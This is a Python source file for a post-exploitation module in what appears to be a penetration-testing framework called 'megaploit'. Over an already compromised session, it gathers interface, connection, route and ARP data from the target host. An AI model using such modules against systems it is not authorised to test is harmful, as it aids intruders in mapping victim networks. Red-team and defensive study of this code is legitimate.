"""megaploit.modules.post.multi.gather.network_info — full network enumeration."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostNetworkInfo(AgentModule):
    name        = "post/multi/gather/network_info"
    description = "Collect interface config, active connections, routes, and ARP cache"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = ["https://attack.mitre.org/techniques/T1016/"]
    platform    = ["windows", "linux", "macos"]
    arch        = []; rank = 400

    def _define_options(self) -> None:
        self._opt("SESSION", OptionType.INTEGER, required=True,
                  description="Session ID to target")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        sections = {}
        for cmd, label in [("ifconfig","Interfaces"),("netstat","Connections"),
                           ("routes","Routes"),("arp","ARP Cache")]:
            out = self._send(cmd, sess)
            sections[label] = out
            self._emit(f"[*] {label}: {len(out.splitlines())} line(s)")
        combined = "\n\n".join(f"=== {k} ===\n{v}" for k, v in sections.items())
        self._ok("Network info collected", **sections)
        return self.results

MODULE = PostNetworkInfo
